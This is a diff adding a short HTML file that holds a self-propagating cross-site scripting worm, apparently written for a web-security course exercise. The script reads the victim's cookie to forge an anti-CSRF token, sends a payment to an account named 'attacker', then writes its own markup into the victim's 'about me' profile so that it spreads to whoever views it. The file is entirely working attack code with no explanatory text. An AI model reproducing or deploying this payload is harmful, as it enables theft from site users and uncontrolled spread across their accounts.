@@ -1,0 +1,22 @@
+<div id="attack">
+  <script>
+  var xhttp = new XMLHttpRequest();
+  var url = '/pay';
+  var data = new FormData();
+  data.append('recipient', 'attacker');
+  data.append('amount', 1);
+  var cookie = decodeURIComponent(document.cookie);
+  var sesh = cookie.slice(cookie.indexOf("=")+1, cookie.length);
+  data.append('anticsrf_token', sesh);
+  xhttp.open('POST', url);
+  xhttp.send(data);
+
+  xhttp = new XMLHttpRequest();
+  url = '/aboutme';
+  data = new FormData();
+  var worm = document.getElementById("attack").outerHTML;
+  data.append('aboutme', worm);
+  xhttp.open('POST', url);
+  xhttp.send(data);
+  </script>
+</div>
